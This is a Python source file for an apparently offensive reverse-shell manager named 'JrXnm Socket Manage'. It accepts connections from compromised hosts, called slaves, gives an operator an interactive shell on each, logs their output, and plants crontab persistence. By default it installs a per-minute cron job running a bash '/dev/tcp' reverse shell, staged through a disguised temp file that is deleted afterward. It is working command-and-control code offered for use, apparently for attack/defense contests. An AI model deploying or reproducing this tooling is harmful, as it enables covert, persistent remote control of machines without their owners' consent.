#! /usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = "JrXnm"
# Date: 18-10-12
import socket
import threading
import datetime
from hashlib import md5
import time
from utils.log import Log
from utils.io import save_info, log_save, server_log
import traceback
import optparse
import re
import string
import random
import base64


MAX_CONNECTION_NUMBER = 16
EXIT_FLAG = False
slaves = {}
interactive_slave = None
interactive_state = 'common_rec'
interactive_user = None


# 每个slave一把锁lock
locks = {}
# 记录最近连接
connections = []
# 记录最近收到消息连接
recent = []


def node_hashs(host, port):
    s = "%s:%d" % (host, port)
    h = md5()
    h.update(s.encode('utf-8'))
    return h.hexdigest()


class Slave(object):
    """Salve"""

    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.name = ''
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hashs(self.hostname, self.port)
        self.interactive = False
        self.first_connect_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def rename(self, name):
        self.name = name

    def getinfo(self):
        return self.name, self.hostname, self.port, self.first_connect_time

    def slave_rec(self):
        lock = locks[self.node_hash]
        lock.acquire()
        # 接受被控shell信息发送给用户
        try:
            while True:
                buf = b''
                if EXIT_FLAG:
                    break
                while True:
                    try:
                        rec = self.socket_fd.recv(2048)
                        buf += rec
                    except Exception as e:
                        server_log(traceback.format_exc())
                    if len(rec) <= 2048:
                        break
                if buf == b'':
                    break
                try:
                    if buf:
                        if interactive_state == 'interactive_state' and interactive_slave == self:
                            bufss = str(buf, encoding="utf-8")
                            fd_send(interactive_user, bufss)
                        elif interactive_state == 'common_rec' or interactive_slave != self:
                            t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
                            path = './log/' + t + self.hostname + ' : ' + str(self.port) + '.log'
                            if [path, datetime.datetime.now()] not in recent:
                                recent.append([path, datetime.datetime.now()])
                            save_info(path, buf, interactive_user)
                except Exception as e:
                    server_log(traceback.format_exc())
                    Log.error('Something wrong in send buf to user, But we saved in to file.', interactive_user)
                    t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
                    path = './log/' + t + self.hostname + ' : ' + str(self.port) + '.log'
                    recent.append([path, datetime.datetime.now()])
                    save_info(path, buf, interactive_user)
                    server_log('\nsomething wrong!\n')
        except:
            server_log(traceback.format_exc())
            lock.release()
        try:
            self.disconnect()
        except:
            pass
        lock.release()

    def save_crontab(self, target_file):
        command = "crontab -l >%s" % target_file
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()

    # from
    def add_crontab(self, content, user_fd):
        # 1. Save old crontab
        Log.info("Saving old crontab\n", user_fd)
        chars = string.ascii_letters + string.digits
        target_file = "/tmp/%s-system.server-%s\n" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 3. Add a new task
        content = bytes(content, 'utf-8')
        Log.info("Add new tasks : %s\n" % (content), user_fd)
        command = 'echo "%s" | base64 -d >>%s\n' % (str(base64.b64encode(content), 'utf-8'), target_file)
        #command = 'ls -la\n'
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...\n", user_fd)
        command = 'crontab %s\n' % target_file
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()
        # 5. Delete temp file
        Log.info("Deleting temp file...\n", user_fd)
        command = "rm -rf %s\n" % (target_file)
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()

    def remove_crontab(self, pattern, user_fd):
        # 1. Save old crontab
        Log.info("Saving old crontab\n", user_fd)
        chars = string.ascii_letters + string.digits
        target_file = "/tmp/%s-system.server-%s\n" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 2. Delete old reverse shell tasks
        Log.info("Removing old tasks in crontab...\n", user_fd)
        command = 'sed -i "/%s/d" %s\n' % target_file
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...\n", user_fd)
        command = 'crontab %s\n' % target_file
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()
        # 5. Delete temp file
        Log.info("Deleting temp file...\n", user_fd)
        command = "rm -rf %s\n" % target_file
        try:
            fd_send(self.socket_fd, command)
        except socket.error:
            self.del_socket()

    def del_socket(self):
        if self.node_hash in slaves.keys():
            slaves.pop(self.node_hash)

    def disconnect(self):
        self.del_socket()
        self.socket_fd.shutdown(socket.SHUT_RDWR)
        self.socket_fd.close()

# def socket_recieve(slave):
#
#     global recent
#     # 没有操作交互shell时，每个连接socket加一个收听进程。
#     shost, sport = slave.socket_fd.getpeername()
#     while True:
#         if EXIT_FLAG:
#             break
#         slave.socket_fd.settimeout(3)
#         try:
#             buf = slave.socket_fd.recv(2048)
#         except socket.timeout:
#             time.sleep(5)
#         if buf == b'':
#             break
#         if buf:
#             t = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
#             path = './log/' + t + shost + ' : ' + str(sport) + '.log'
#             recent.append([path, datetime.datetime.now()])
#             with open(path, 'wb') as f:
#                 f.write(buf)
#         while interactive_state:
#             if interactive_slave.socket_fd != slave.socket_fd:
#                 break
#             time.sleep(0.5)


def random_string(length, chars):
    return "".join([random.choice(chars) for i in range(length)])


def check_online_slave():
    l = []
    for key in slaves.keys():
        try:
            msg = '\n'
            fd_send(slaves[key].socket_fd, msg)
            fd_send(slaves[key].socket_fd, msg)
        except socket.error:
            server_log(traceback.format_exc())
            l.append(key)

    for key in l:
        slaves.pop(key)


def transfer2user(user_fd, mod, **kwargs):
    """所有接受用户消息进程都归于此"""
    global interactive_slave, EXIT_FLAG, interactive_state, choosed_slave, interactive_user
    choosed_slave = None
    while True:
        server_log('get user info\n')
        if EXIT_FLAG:
            break
        if mod != 'interactive_shell':
            if choosed_slave:
                if choosed_slave.name:
                    msg = '(' + choosed_slave.name + ')'
                else:
                    msg = '(' + choosed_slave.hostname + ')'
                Log.error(msg, user_fd)
            Log.command('>>>', user_fd)
        buf = user_fd.recv(2048)
        if buf == b'':
            break
        if buf:
            command = str(buf, encoding="utf-8")
            server_log(command)
            if mod == 'interactive_shell':
                slave_fd = kwargs['slave_fd']
                slave = kwargs['slave']
                if command == 'Ex1t\n':
                    interactive_state = 'common_rec'
                    interactive_slave = None
                    break

                try:
                    fd_send(slave_fd, command)
                except socket.error:
                    slave.del_socket()
                if command == 'exit\n':
                    time.sleep(0.5)
                    try:
                        msg = '\n'
                        fd_send(slave_fd, msg)
                        fd_send(slave_fd, msg)
                        # slaves[key].socket_fd.recv(2048)
                    except socket.error:
                        server_log(traceback.format_exc())
                        check_online_slave()
                        interactive_state = 'common_rec'
                        interactive_slave = None
                        break
            elif mod == 'Control_Command':
                if command == 'show\n' or command == 's\n':
                    check_online_slave()
                    print_salve(user_fd)
                elif command == '\n':
                    continue
                elif command == 'recent\n' or command == 'r\n':
                    recent_log(user_fd)
                elif command == 'i\n':
                    slave = choosed_slave
                    interactive_slave = choosed_slave
                    if not slave:
                        msg = 'Please choose the slave you want to Control\n'
                        Log.warning(msg, user_fd)
                        continue
                    interactive_state = 'interactive_state'
                    t = threading.Thread(target=transfer2user, args=(user_fd, 'interactive_shell'),
                                         kwargs={'slave_fd': slave.socket_fd, 'slave': slave})
                    t.start()
                    while interactive_state == 'interactive_state':
                        if EXIT_FLAG:
                            break
                        time.sleep(1)
                    choosed_slave = None
                elif command == 'exit\n':
                    interactive_user == None
                    user_fd.shutdown(socket.SHUT_RDWR)
                    user_fd.close()
                    break
                elif command[0:6] == 'choose' or command == 'c\n':
                    #check_online_slave()
                    if command == 'c\n' or command == 'choose\n':
                        msg = 'input the number of slave\n'
                        Log.warning(msg, user_fd)
                        print_salve(user_fd)
                        choosed_slave = transfer2user(user_fd, 'choose_slave')
                    elif command[0:7] == 'choose ':
                        pa = re.compile(r'choose\s+(.*?)\n')
                        res = pa.findall(command)
                        if res:
                            i = 0
                            for key in slaves.keys():
                                if str(i) == res[0]:
                                    choosed_slave = slaves[key]
                                    break
                                i += 1
                            if choosed_slave:
                                msg = 'select the slave :'
                                msg += choosed_slave.hostname + ' : ' + str(choosed_slave.port) + '\n'
                                Log.success(msg, user_fd)
                            else:
                                msg = 'Do not have this slave.\n'
                                fd_send(user_fd, msg)
                elif command == 'del\n':
                    slave = choosed_slave
                    if not slave:
                        msg = 'Please choose the slave you want to Control\n'
                        Log.error(msg, user_fd)
                        continue
                    slave.disconnect()

                    msg = 'success to delete the slave \n'
                    Log.success(msg, user_fd)
                    choosed_slave = None
                elif command[0:4] == 'name' and command[4] == ' ':
                    slave = choosed_slave
                    if not slave:
                        msg = 'Please choose the slave you want to Control\n'
                        Log.error(msg, user_fd)
                        continue
                    pa = re.compile(r'name\s+(.*?)\n')
                    res = pa.findall(command)
                    if not res:
                        msg = 'Please rewrite the name.\n'
                        Log.error(msg, user_fd)
                        continue
                    slave.name = res[0]
                    choosed_slave = None
                elif command[0:3] == 'add' and (command[3] == ' ' or command[3] == '\n'):
                    slave = choosed_slave
                    if not slave:
                        msg = 'Please choose the slave you want to Control\n'
                        Log.error(msg, user_fd)
                        continue
                    if command[3] == ' ':
                        pa = re.compile(r'add\s+(.*?)\n')
                        res = pa.findall(command)
                        if not res:
                            msg = 'Please rewrite the add command.\n'
                            Log.error(msg, user_fd)
                            continue
                        slave.add_crontab(res[0], user_fd)
                    else:
                        content = '''\n* * * * *  bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"\n'''
                        slave.add_crontab(content, user_fd)
                else:
                    print_command(user_fd)
            elif mod == 'choose_slave':
                slave_num = command.strip()
                if slave_num == 'q':
                    return None
                i = 0
                for key in slaves.keys():
                    if str(i) == slave_num:
                        choosed_slave = slaves[key]
                        break
                    i += 1
                if choosed_slave:
                    msg = 'select the slave :'
                    msg += choosed_slave.hostname + ' : ' + str(choosed_slave.port) + '\n'
                    Log.success(msg, user_fd)
                    return choosed_slave
                else:
                    msg = 'Do not have this slave.\n'
                    fd_send(user_fd, msg)
                    return None


def print_salve(user_fd):
    i = 0
    for key in slaves.keys():
        info = slaves[key].getinfo()
        sinfo = '[' + str(i) + '] '
        for m in info:
            sinfo += str(m) + ' '
        sinfo += '\n'
        Log.info(sinfo, user_fd)
        i += 1
    if i == 0:
        msg = 'Do not have slaves, you can check the log\n'
        Log.warning(msg, user_fd)


def recent_log(user_fd):
    msg = 'Here are recent Connections:\n'
    Log.warning(msg, user_fd)
    msg = ''
    for connection in connections:
        shost, sport, dates = connection[0], connection[1], connection[2]
        t = dates.strftime("[ %Y-%m-%d %H:%M:%S ]")
        msg += t + ' ' + shost + ' : ' + sport + '\n'

    if not connections:
        msg = 'Do not have connections Logs\n'
    Log.info(msg, user_fd)

    msg = '\n\nHere are recent information:\n'
    Log.warning(msg, user_fd)
    msg = ''
    for rec in recent:
        path, dates = rec[0], rec[1]
        try:
            with open(path, 'rb') as f:
                s = str(f.read(), 'utf-8')
            msg += path + '\n' + s + '\n\n'
        except:
            msg += path + '\n' + 'This file have something wrong!.\n\n'

    if not recent:
        msg = 'Do not have recent information Logs\n'
        msg += 'You can read entail Log in directory\n'
    Log.info(msg, user_fd)

    # 删除内存中太久之前的Log
    now = datetime.datetime.now()
    for connection in connections:
        dates = connection[2]
        if (now - dates).seconds > 60:
            connections.remove(connection)
        else:
            break
    for rec in recent:
        dates = rec[1]
        if (now - dates).days > 5:
            recent.remove(rec)
        else:
            break


def print_command(user_fd):
    msg = '''    [show] : show all slave
    [i] : open a interactive shell (after choose)
    [del] : delete the slave (after choose)
    [choose] : choose a slave
    [name xxxx] : rename a slave (after choose)
    [recent] : To print Recent connect log
    [add xxxx] : add crontab, if not xxxx then default bash shell (after choose)
    [exit] : exit\n'''
    Log.info(msg, user_fd)


def master(port):
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind(('', port))
    master_fd.listen(MAX_CONNECTION_NUMBER)

    while True:
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        slave = Slave(slave_fd)
        slaves[slave.node_hash] = slave

        # 记录连接
        lock = threading.RLock()
        locks[slave.node_hash] = lock
        now = datetime.datetime.now()
        connections.append([slave.hostname, str(slave.port), now])
        log_save(slave_fd, interactive_user)
        t = threading.Thread(target=slave.slave_rec)
        t.start()
        try:
            msg = '\nSlave %s : %d is Online!\n' % (slave.hostname, slave.port)
            server_log(msg)
            if interactive_user:
                Log.warning(msg, interactive_user)
                Log.command('>>>', interactive_user)
        except Exception as e:
            server_log(traceback.format_exc())

    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def printlogo(user_fd):
    s = '''       ___    __   __                
      |_  |   \ \ / /                
        | |_ __\ V / _ __  _ __ ___  
        | | '__/   \| '_ \| '_ ` _ \ 
    /\__/ / | / /^\ \ | | | | | | | |
    \____/|_| \/   \/_| |_|_| |_| |_|

                           Socket Manage\n'''
    Log.error(s, user_fd)


def fd_send(fd, message):
    infob = str.encode(message)
    fd.sendall(infob)


def check_admin(user_fd):
    hint = 'This is JrXnm socket manage, Please send your token.\n'
    for i in range(3):
        Log.info(hint, user_fd)

        try:
            buf = user_fd.recv(2048)
        except socket.timeout:
            Log.error('TimeOut!', user_fd)
        if buf == b'':
            break
        with open('auth', 'r') as f:
            psw = f.read()
        if buf:
            bufss = str(buf, encoding="utf-8")
            if bufss != psw:
                hint = 'Authentication failed, Please send again!\n'
                continue
            printlogo(user_fd)
        return True
    return False


class Administrator(object):
    """TODO"""
    def __init__(self, name='admin'):
        self.name = name


def user_connect(port):
    server_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_fd.bind(('', port))
    server_fd.listen(5)

    while True:
        if EXIT_FLAG:
            break
        user_fd, user_addr = server_fd.accept()
        t1 = threading.Thread(target=manage, args=(user_fd,))
        t1.start()


def manage(user_fd):
    check_user = check_admin(user_fd)

    if check_user:
        msg = 'You are admin now \n'
        Log.success(msg, user_fd)
    else:
        msg = 'You are not admin, exit now \n'
        Log.info(msg, user_fd)
        user_fd.shutdown(socket.SHUT_RDWR)
        user_fd.close()
        return False
    global interactive_user
    interactive_user = user_fd
    t = threading.Thread(target=transfer2user, args=(user_fd, 'Control_Command'))
    t.start()


def main():
    # 管理进程，接受反弹shell以及消息.
    parse = optparse.OptionParser("python %prog --server-port <target stream> --user-port <target file path>")
    parse.add_option('--server-port', dest='sport', type='int', help='Server listen this port.')
    parse.add_option('--user-port', dest='uport', type='int', help='User connect from this port')

    (options, args) = parse.parse_args()
    if not options.sport or not options.uport:
        print('Use -h to see usage')
    else:
        t1 = threading.Thread(target=master, args=(options.sport,))
        t1.start()
        user_connect(options.uport)


if __name__ == '__main__':
    main()





